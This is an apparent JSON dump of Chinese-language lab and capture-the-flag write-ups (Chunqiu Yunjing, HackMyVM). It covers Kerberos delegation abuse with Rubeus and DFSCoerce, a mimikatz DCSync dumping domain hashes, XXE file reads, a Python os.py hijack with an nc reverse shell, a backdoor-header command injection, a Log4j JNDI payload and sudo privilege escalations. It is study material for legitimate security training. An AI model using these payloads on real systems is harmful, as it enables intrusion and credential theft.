time: 2022-06-22 22:54:34 +0800 CST[i] CSVs written to &#x27;csv&#x27; directory in C:\\Users\\lv\\Desktop[i] Execution took 1.0246743s 12[i] Unconstrained Deligation Users: 1 found [+] WIN19$ WIN19$有非约束委派，上传Rubeus进行监听 1Rubeus.exe monitor /interval:1 /filteruser:DC01$ 12345678910111213141516C:\\Users\\lv\\Desktop&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$ ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0[*] Action: TGT Monitoring[*] Target user : DC01$[*] Monitoring every 1 seconds for new TGTs 然后使用dfscoerce让DS向WIN19$认证 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# proxy -f proxychains4.conf -q python3 ../script/AD/dfscoerce.py -u &quot;WIN19$&quot; -hashes :d41fef724adf6f2ed2cbb5a4ebd186c9 -d xiaorang.lab WIN19 172.22.4.7[-] Connecting to ncacn_np:172.22.4.7[\\PIPE\\netdfs][+] Successfully bound![-] Sending NetrDfsRemoveStdRoot!NetrDfsRemoveStdRootServerName: &#x27;WIN19\\x00&#x27;RootShare: &#x27;test\\x00&#x27;ApiFlags: 1DFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748C:\\Users\\lvv\\Desktop&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$ ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0[*] Action: TGT Monitoring[*] Target user : DC01$[*] Monitoring every 1 seconds for new TGTs[*] 2025/4/18 4:54:32 UTC - Found new TGT: User : DC01$@XIAORANG.LAB StartTime : 2025/4/18 10:28:04 EndTime : 2025/4/18 20:28:04 RenewTill : 2025/4/25 10:28:04 Flags : name_canonicalize, pre_authent, renewable, forwarded, forwardable Base64EncodedTicket : doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRn dBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6F05kURrtAGLPwnEu0x0RxvAPS3m5aRx/bjVuGQLR7b0+L x5X557jubFee2VfyECSf1RICTWkdJttbkCj4s6IMQrVpe8jFgy3Uki4NC0WdUfzH1nIiJSCq0lRPzgI88NGOrQEbDaurBzq150lY i68ssuARb6DWCu6HYLjq66NSI53LNGAHqlNVoU+83ZOhJboPDjY2XL74OXFh0Qr57fWAbUOWegzVPHFicFshmeiMv111lfJr0X6Q aqATuWtvoSsDI+/v3HyGMlqmlqJmmt0coW9z0L6V52yL7XA2YfXod7N+hWb/gclV5+C1G7GNj/uM3Zi5DyJ9kk+IuWHKWRRrz7JR iPDy9zMJWBDgeMsEEmB/uh492tq+i3g8o49PocQ2TqcnRBPCiAEbpWhpz/LDb6P6f+ySqupcTcM5q9G+6CT6Rj/aMDAjqZEsRpfb agn3XEjKWbF+kpAuuvr+eGd0xICbySdM21JRTjqZmZmUPkEe5Y0zKH+wVUUVJOAv8BVeKirxdKtYyDYiudFtUUGGkIzt2Z3J1yJY GA8B90UklsraI8O6Q83i2nE11WkcxEXceYh7PBoeL6ivncb8UqZK2Nh07+1QlILNCx+5WFFLjNSoBLhofg3TIsPCr2zFNXTNbBPv zP+bjqJawf7BY0KUWNLvgAltKMXX1T9pzNREspsKwRMjXZgsyTbil3reoEciEexNtXVhWxrk+xbp9DIL/74f4rafpIMsi7myoH6a u1kjVexmmP4wOWp7KGvMm1gNp+XeakyHPiFlqIt4V0b4KGfd9Zd3rtQI3gtM7oeUm6PDlEn9vK0MVBpZZJeW6IDkZdXC7SBmPM1z p0uno3wGRj0MuqqnPaV8XRJR0sEaNGD8HABfQkdCMHm5GQ8w71AIEy9i2otNPegf6P0j4EPsNwtyo2o97GKu/y27tvKv1FH43S4G ij5gjiKBxIn2JtQ9oPvb0v+2SZWU08xE6v+b79PsWvr5STsl4eUJHnTuXizQfsY597gQAVgKD7vKeIXEsgb11VVP9HCtUjxCmBNS 25QzZvXbuWkEJ6k/7AYu0qvT3auHC1cbf4MmuMrc/DlT4MphkuUF5j8hfSEgEAVWhVZVuPZA3v6C+O8PYmDl1d9lT6JjZ5wuQrAG Dwt7+cZ9wzuWLDUkB1dtiTm0cuFLXAmOLLDjpSWxIXK2B9TNAagAq2slNrb775ovLLdo/swtuRAKazjqgCAygra59RWoqP+loVv8 nxii1cB/M4tFLpGuZlTdOnyME8JT8D40++QW5IxMPffywi5tpjhDUnVC1wtK49BOaljvJKH8LcWHWyALrv2j8De6HPabKhCcnDiY /w7QHVbcAh/Jo64uH2aYRSQEz5j7oGpAAP3ENCvzEaV8e/53wwRqjyife177PX7j9/ZfoqzfiRnr1kjeHIZsGw5zYyTmLbB/91Np RN2jgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCClV6tyB9NAYvRnxe9wuyHOhysxVh63TouQkdqL 8MLxbKEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDQxODAyMjgwNFqmERgPMjAy NTA0MTgxMjI4MDRapxEYDzIwMjUwNDI1MDIyODA0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9S QU5HLkxBQg==[*] Ticket cache size: 1 导入 TGT 然后 DCSync 1Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6rh73GDFsxBznVrGsdmcNb9fO1z8fVnV/kQUwXHY0vvUHSorZebamFLkiZi+LEkih3n4TJMOlCI8vlnlS5lPlr03uPc5nd6Pw7PWoVw7m2UH/TmMy4nuBKVVbKEIImNbFyhTleg75qJ+5D224ws/fpRGtQyH0WPmyMbevlI+xTTOLJGe9+YScZMva/hvc2nPq09ZNNzIMo8erEYpJCv1VucuzcoUrJFGTtASWqa0Aaeza+mypwP7OGmc2qnQEMu8l1XIEqe7JYdY934vsm37k8KarPLFlzyOhbzDW4t/GjlZ1aHXSLj332T90BxfZKoSe7tnA8cldicFQ8LmGBWBKeKms6sc8K4KQVGMdhyjno5L5jeKqtL49oc+a44kyJYlGjXnKpep5seUp3+2TXXvmF9/HnHSG+M6QQpepWGdfk6diRhgDvZyq1AX6GggRsXfIEpE721UcTowO2HQOfsv+W++pTiAoEvrkU6ciJ3VI3EZFelGkq3hfZ3MQydIdBCPVeaDwE1fcp05wGuDmuFDhf+C1nelwaTqYJIZScVgR+7o4FcGpStyycsbBMfzdasL70KSV3se6ZlvY24/Binnb3YOHMpWkpLRjUovQ7ep2fCN0f6Pt/P8JTCVC0oCFIy05otlw3n8nd4NctrNBWQBevIiuAobMrJ1Ww5UbSQHrCF6hTV6NTbL1irI3wR10rwNkaxWpspvcL5/HOTzXXRtq619o0lTdpz60KSroci5nuj4WfPtQ6ESiU8c4P9Y/exWUmhOGN10Wg1t4j4k+agTrvK2dy2ybLn1FNkqWMfMr3vcUm8BU7ESstKZp47FG1pkaQl6/bjGwElN0BhycbT8L1yxIj+rFspX3d6olXwiMIaF50EV5DM1V3oH/OJu5sHbIFqrGkRqooDTfrHyF8c1AnruzDtD2lxipt043llvOURkRj8Qd/qIiRZBqnYo4RD95J9J8Jbim35hFzbuV5PMS5Ekw9oRfzsGCD5VeKBb9i02mJTvWUqJjZi/YWI9wKaeKKCTKHYKKSmDfkJlF4gLUp12XwuTe4zEwhXUgBYEC7N7EA6u0/9dxwL5AWaRtOqL05rgFu2Ix2+wfBu1n4ToxGmYke44n6JSSXCqKW2KPkznAU0QPvhcYwjZsOFo4R/bVe9qQAcHBLwQ+9fq8DZBnRStKlgmIMeJXCPAPv5da69p2BnR4Bq+X71X5pWB4C0xHZtmxZ71ahe+cZYmDaap8SEvI7BDTkKaDDnvp3cLSVvX5k5uGrjq06yKqpYjlcfai1Yy8GXlecqf2xQ8b6RjkdPkHKVLQZdGZdZMc77Bj5IXwlGvwSQK5PMxo4z1zceza8WQ7WM/iIVwwDAEklXK9bW3pjfHCX9sB5YxAUA/BbJMxuSc1Q2yMpc8CrRNoNNPY184wjlPMAE0wLtAkkiJJlmhkupOA7ZpdlAwvYPEujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCkn5s0Ub8lLXnRynzBbuyWO7uYW7F68Wp1NYL+h5IWoqEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDIxMDA1Mjg0N1qmERgPMjAyNTAyMTAxNTI4NDdapxEYDzIwMjUwMjE3MDUyODQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg== 12345678910111213141516mimikatz.exe &quot;lsadump::dcsync /all /csv&quot;[DC] &#x27;xiaorang.lab&#x27; will be the domain[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server[DC] Exporting domain &#x27;xiaorang.lab&#x27;[rpc] Service : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502 krbtgt 767e06b9c74fd628dd13785006a9092b 5141105 Aldrich 98ce19dd5ce74f670d230c7b1aa016d0 5121106 Marcus b91c7cc463735bf0e599a2d0a04df110 5121112 WIN-3X7U15C2XDM$ c3ddf0ffd17c48e6c40e6eda9c9fbaf7 40961113 WIN-YUUAW2QG9MF$ 125d0e9790105be68deb6002690fc91b 40961000 DC01$ 23414273a692373e6e076d5fdbb2c213 532480500 Administrator 4889f6553239ace1f7c47fa2c619c252 5121103 FILESERVER$ dd213f63df5b16b2daa567705ca88ac7 40961104 WIN19$ b6547b5e9c27c42b5cb096f1c922bc3a 528384 可以拿到域控的哈希 然后登录即可 1C:\\Users\\Administrator\\flag&gt; type flag04.txt","categories":[{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-system","slug":"Hackmyvm-system","date":"2025-04-17T07:21:48.000Z","updated":"2025-04-19T13:25:36.799Z","comments":true,"path":"2025/04/17/Hackmyvm-system/","permalink":"https://lvzhouhang.xyz/2025/04/17/Hackmyvm-system/","excerpt":"","text":"信息搜集arp-scan -l 1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:72:be:a6 PCS Systemtechnik GmbH192.168.31.141 08:00:27:27:28:54 PCS Systemtechnik GmbH 192.168.31.141就是靶机ip 12345678910┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.141Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 03:39 EDTNmap scan report for 192.168.31.141Host is up (0.0029s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:27:28:54 (PCS Systemtechnik/Oracle VirtualBox virtual NIC) 80端口有一个登录的页面，通过查看请求头可以发现他是以xml的格式传输的 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;details&gt;&lt;email&gt;123@123.com&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/details&gt; 试一试xxe注入 123&lt;!DOCTYPE test [ &lt;!ENTITY test1 SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;details&gt;&lt;email&gt;$test1;&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/details&gt; 12345678910111213141516171819202122232425262728&lt;p align=&#x27;center&#x27;&gt; &lt;font color=white size=&#x27;5pt&#x27;&gt; root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinavahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologindavid:x:1000:1000::/home/david:/bin/bash is already registered! &lt;/font&gt; &lt;/p&gt; 读取david用户的私钥尝试登录，但是会登录失败，通过fuzz可以知道/home/david还有一个.viminfo 1ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.31.141/magic.php -d &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///home/david/FUZZ&quot;&gt; ]&gt; &lt;details&gt;&lt;email&gt;&amp;xxe;&lt;/email&gt;&lt;password&gt;das&lt;/password&gt;&lt;/details&gt;&#x27; --fw 11 1234567891011121314151617181920212223242526272829303132333435363738 # This viminfo file was generated by Vim 8.2.# You may edit it if you&#x27;re careful!# Viminfo version|1,4# Value of &#x27;encoding&#x27; when this file was written*encoding=utf-8# hlsearch on (H) or off (h):~h# Command Line History (newest to oldest)::wq!|2,0,1648909714,,&quot;wq!&quot;# Search String History (newest to oldest):# Expression History (newest to oldest):# Input Line History (newest to oldest):# Debug Line History (newest to oldest):# Registers:# Password file Created:&#x27;0 1 3 /usr/local/etc/mypass.txt|4,48,1,3,1648909714,&quot;/usr/local/etc/mypass.txt&quot;# History of marks within files (newest to oldest):&gt; /usr/local/etc/mypass.txt * 1648909713 0 &quot; 1 3 ^ 1 4 . 1 3 + 1 3 然后读取/usr/local/etc/mypass.txt文件 david的密码为h4ck3rd4v!d 提权上传一个pspy64查看，发现每隔一段时间会运行一次suid.py文件 12025/04/18 04:01:01 CMD: UID=0 PID=670 | /bin/sh -c /usr/bin/python3.9 /opt/suid.py 12345678910111213141516171819202122#suid.pyfrom os import systemfrom pathlib import Path# Reading only first linetry: with open(&#x27;/home/david/cmd.txt&#x27;, &#x27;r&#x27;) as f: read_only_first_line = f.readline() # Write a new file with open(&#x27;/tmp/suid.txt&#x27;, &#x27;w&#x27;) as f: f.write(f&quot;&#123;read_only_first_line&#125;&quot;) check = Path(&#x27;/tmp/suid.txt&#x27;) if check: print(&quot;File exists&quot;) try: os.system(&quot;chmod u+s /bin/bash&quot;) except NameError: print(&quot;Done&quot;) else: print(&quot;File not exists&quot;)except FileNotFoundError: print(&quot;File not exists&quot;) 这个脚本永远不会执行chmod，查看是否可以劫持 1234python3 -c &#x27;import sys; print(sys.path)&#x27;[&#x27;&#x27;, &#x27;/usr/lib/python39.zip&#x27;, &#x27;/usr/lib/python3.9&#x27;, &#x27;/usr/lib/python3.9/lib-dynload&#x27;, &#x27;/usr/local/lib/python3.9/dist-packages&#x27;, &#x27;/usr/lib/python3/dist-packages&#x27;]david@system:/usr/lib/python3.9$ find ./ -writable 2&gt;/dev/null./os.py 向os.py尾部添加 12345import subprocessdef shell(): import subprocess subprocess.call(&quot;nc&quot; + &quot;192.168.31.129 9999 -e /bin/bash&quot;, shell=True)shell() 然后监听一个端口静静等shell弹回来 12iduid=0(root) gid=0(root) groups=0(root)","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Blackhat","slug":"Hackmyvm-Blackhat","date":"2025-04-17T04:14:42.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/04/17/Hackmyvm-Blackhat/","permalink":"https://lvzhouhang.xyz/2025/04/17/Hackmyvm-Blackhat/","excerpt":"","text":"信息搜集arp-scan -l扫描 1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:73:b2:7a PCS Systemtechnik GmbH192.168.31.140 08:00:27:19:a9:32 PCS Systemtechnik GmbH 192.168.31.140是靶机地址 然后扫描端口 1234567891011┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.140Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 00:16 EDTNmap scan report for 192.168.31.140Host is up (0.0019s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE80/tcp open httpMAC Address: 08:00:27:19:A9:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds 只开了一个80端口，扫描一下目录可以扫描到一个phpinfo.php 1Loaded Modules core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_backdoor mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status mod_backdoor 存在漏洞 123┌──(root㉿kali)-[~/Desktop/tmp]└─# curl 192.168.31.140 -H &quot;Backdoor: id&quot;uid=33(www-data) gid=33(www-data) groups=33(www-data) 反弹一个shell出来，上传 linpeas.sh ，运行看结果 12345678╔══════════╣ Files with ACLs (limited to 50)╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls# file: /etc/sudoersUSER root r--user darkdante rw-GROUP root r--mask rw-other --- 可以看到sudoers文件darkdante有写的权限，darkdante直接su就登录了哈哈哈哈哈 写入sudoers文件 1darkdante ALL=(ALL:ALL) ALL 然后sudo su，提权成功","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"春秋云镜-Certify","slug":"春秋云镜-Certify","date":"2025-04-16T15:55:55.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/04/16/春秋云镜-Certify/","permalink":"https://lvzhouhang.xyz/2025/04/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/","excerpt":"","text":"FLAG1先用fscan扫一扫 1234567891011121314151617181920212223242526272829┌──(root㉿kali)-[~/Desktop/tmp]└─# ../pentest/fscan/fscan2 -h 39.99.135.211┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-16 11:59:40] [INFO] 暴力破解线程数: 1[2025-04-16 11:59:40] [INFO] 开始信息扫描[2025-04-16 11:59:40] [INFO] 最终有效主机数量: 1[2025-04-16 11:59:41] [INFO] 开始主机扫描[2025-04-16 11:59:41] [INFO] 有效端口数量: 233[2025-04-16 11:59:41] [SUCCESS] 端口开放 39.99.135.211:22[2025-04-16 11:59:41] [SUCCESS] 端口开放 39.99.135.211:80[2025-04-16 11:59:41] [SUCCESS] 服务识别 39.99.135.211:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-16 11:59:45] [SUCCESS] 端口开放 39.99.135.211:8983[2025-04-16 11:59:46] [SUCCESS] 服务识别 39.99.135.211:80 =&gt; [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu[2025-04-16 11:59:55] [SUCCESS] 服务识别 39.99.135.211:8983 =&gt; [http] 产品:Apache Solr Banner:[HTTP/1.1 302 Found.Location: http://172.22.9.19:8983/solr/.][2025-04-16 11:59:55] [INFO] 存活端口数量: 3[2025-04-16 11:59:55] [INFO] 开始漏洞扫描[2025-04-16 11:59:55] [INFO] 加载的插件: ssh, webpoc, webtitle[2025-04-16 11:59:55] [SUCCESS] 网站标题 http://39.99.135.211 状态码:200 长度:612 标题:Welcome to nginx![2025-04-16 11:59:56] [SUCCESS] 网站标题 http://39.99.135.211:8983 状态码:302 长度:0 标题:无标题 重定向地址: http://39.99.135.211:8983/solr/[2025-04-16 11:59:57] [SUCCESS] 网站标题 http://39.99.135.211:8983/solr/ 状态码:200 长度:16555 标题:Solr Admin[2025-04-16 12:00:04] [SUCCESS] 扫描已完成: 5/5 39.99.135.211:8983是一个solr面板，存在log4j漏洞 1http://39.99.135.211:8983/solr/admin/cores?action=$&#123;jndi:ldap://tc94uide908k5qcv0xurpcoorfx6lw9l.oastify.com&#125; 上vps，可以利用java-chains反弹一个shell,反弹的shell如果不舒服可以写一个公钥进去 12345678solr@ubuntu:/opt/solr$ sudo -lsudo -lMatching Defaults entries for solr on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser solr may run the following commands on ubuntu: (root) NOPASSWD: /usr/bin/gr 提权sudo grc --pty /bin/sh 123solr@ubuntu:~$ sudo grc --pty /bin/sh# iduid=0(root) gid=0(root) groups=0(root) 提权到root后，写一个公钥进去，flag01在/root/flag下，然后上传一个fscan，再做一个代理 FLAG2查看一下内网的ip端，开扫！ 12345678910111213root@ubuntu:/tmp# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:26:2b:c3 brd ff:ff:ff:ff:ff:ff inet 172.22.9.19/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 315357456sec preferred_lft 315357456sec inet6 fe80::216:3eff:fe26:2bc3/64 scope link valid_lft forever preferred_lft forever 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485root@ubuntu:/tmp# ./fscan2 -h 172.22.9.19/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-17 00:40:03] [INFO] 暴力破解线程数: 1[2025-04-17 00:40:03] [INFO] 开始信息扫描[2025-04-17 00:40:03] [INFO] CIDR范围: 172.22.9.0-172.22.9.255[2025-04-17 00:40:03] [INFO] 生成IP范围: 172.22.9.0.%!d(string=172.22.9.255) - %!s(MISSING).%!d(MISSING)[2025-04-17 00:40:03] [INFO] 解析CIDR 172.22.9.19/24 -&gt; IP范围 172.22.9.0-172.22.9.255[2025-04-17 00:40:03] [INFO] 最终有效主机数量: 256[2025-04-17 00:40:03] [INFO] 开始主机扫描[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.19 存活 (ICMP)[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.7 存活 (ICMP)[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.26 存活 (ICMP)[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.47 存活 (ICMP)[2025-04-17 00:40:06] [INFO] 存活主机数量: 4[2025-04-17 00:40:06] [INFO] 有效端口数量: 233[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:88[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:80[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:80[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:22[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.19:80[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:21[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.19:22[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:445[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:445[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:445[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:389[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:139[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:139[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:139[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:135[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:135[2025-04-17 00:40:06] [SUCCESS] 服务识别 172.22.9.47:22 =&gt; [ssh] 版本:7.6p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.][2025-04-17 00:40:07] [SUCCESS] 服务识别 172.22.9.47:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).][2025-04-17 00:40:07] [SUCCESS] 服务识别 172.22.9.19:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-17 00:40:11] [SUCCESS] 服务识别 172.22.9.7:88 =&gt;[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.19:80 =&gt; [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.26:445 =&gt;[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:80 =&gt; [http][2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:445 =&gt;[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:389 =&gt;[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:139 =&gt; Banner:[.][2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.26:139 =&gt; Banner:[.][2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.47:80 =&gt; [http][2025-04-17 00:41:07] [SUCCESS] 服务识别 172.22.9.47:445 =&gt;[2025-04-17 00:41:07] [SUCCESS] 服务识别 172.22.9.47:139 =&gt;[2025-04-17 00:41:12] [SUCCESS] 服务识别 172.22.9.7:135 =&gt;[2025-04-17 00:41:12] [SUCCESS] 服务识别 172.22.9.26:135 =&gt;[2025-04-17 00:41:12] [INFO] 存活端口数量: 16[2025-04-17 00:41:12] [INFO] 开始漏洞扫描[2025-04-17 00:41:12] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.19 状态码:200 长度:612 标题:Welcome to nginx![2025-04-17 00:41:12] [SUCCESS] NetInfo 扫描结果目标主机: 